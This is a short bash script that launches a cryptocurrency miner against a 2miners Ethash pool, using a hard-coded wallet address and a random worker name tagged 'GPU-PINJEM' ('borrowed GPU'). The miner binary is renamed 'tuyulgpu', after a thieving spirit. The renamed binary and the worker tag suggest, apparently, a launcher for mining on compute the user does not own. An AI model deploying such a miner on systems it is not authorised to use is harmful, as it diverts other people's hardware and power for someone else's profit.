#!/bin/bash

POOL=asia-etc.2miners.com:1010

WALLET= 0x77d9dcda20f11681d9faee0ed771ac9edc7d256f

WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)

chmod +x tuyulgpu

./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
